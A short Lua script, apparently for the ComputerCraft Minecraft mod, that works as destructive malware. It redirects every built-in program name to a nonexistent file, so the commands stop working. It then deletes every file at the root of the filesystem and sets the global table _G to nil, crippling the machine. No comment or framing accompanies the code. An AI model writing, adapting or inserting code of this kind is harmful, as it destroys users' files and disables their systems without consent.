local fllst = fs.list("/rom/programs/")
local mnfllst = fs.list("/")
for k,v in pairs(fllst) do
    local flnm = v:match("[^.]+")
    shell.setAlias(flnm, "/roms/programs/no.lua")
end
for k,v in pairs(mnfllst) do
    fs.delete("/"..v)
end
_G = nil
